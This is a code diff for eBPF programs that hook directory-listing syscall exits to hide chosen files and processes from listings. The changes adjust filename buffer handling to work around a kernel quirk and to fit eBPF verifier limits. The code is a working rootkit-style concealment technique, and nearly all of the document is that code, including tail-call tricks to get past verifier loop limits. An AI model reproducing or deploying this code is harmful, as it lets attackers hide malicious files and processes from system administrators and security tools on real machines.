@@ -95,7 +95,6 @@ int hide_pid_exit(struct trace_event_raw_sys_exit *ctx)
     if (bpos_ptr != NULL) {
         bpos = *bpos_ptr;
     }
-    
     // We are going to loop through until we find the name of folder we want to hide
     // As we are also limited by the eBPF verifier, we have a maximum loop allowed so to bypass that we are going to use tail calls
 
@@ -103,7 +102,9 @@ int hide_pid_exit(struct trace_event_raw_sys_exit *ctx)
     struct linux_dirent64 *dirp = 0;
     struct linux_dirent64 *dirp_previous = 0;
     char filename[32]; // I don't think we are going to have a filename longer than 32 characters to hide
-    memset(filename, 0, 32);
+    for (int e = 0; e < 32; e++) {
+        filename[e] = 0x00;
+    }
     short unsigned int d_reclen = 0;
 
     for (int i = 0; i < 200; i++)
@@ -112,11 +113,18 @@ int hide_pid_exit(struct trace_event_raw_sys_exit *ctx)
             break;
         dirp = (struct linux_dirent64 *)((void *)buff_addr + bpos);
         bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
-        bpf_probe_read_str(&filename, sizeof(char)*32, dirp->d_name);
-
+        bpf_probe_read_str(&filename, 32, dirp->d_name);
+        int first_null = 0;
+        for (int e = 0; e < 32; e++) {  // Patching https://lore.kernel.org/all/cover.1604620776.git.dxu@dxuuu.xyz/T/ as my kernel does break some things
+            if (filename[e] == 0x00) {
+                first_null = 1;
+            }
+            if (first_null == 1) {
+                filename[e] = 0x00;
+            }
+        }
         int *found = bpf_map_lookup_elem(&files_to_hide, &filename);
         if (found != 0) { // We found a file to hide
-            // bpf_printk("Found a file to hide: %s\n", filename);
             // Tailcall to the function that will hide the file
             bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp_previous, 0); // Saving our dirent ptr to patch
             bpf_tail_call(ctx, &map_prog_array, 1);
@@ -167,7 +175,6 @@ int hide_pid_make_it_disappear(struct trace_event_raw_sys_exit *ctx)
 
     // We finished processing it, let's go back to the loop in case there's more to hide
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
-    bpf_map_update_elem(&dirent_offset, &pid_tgid, &bpos, 0);
     bpf_tail_call(ctx, &map_prog_array, 0);
     return 0;
 }
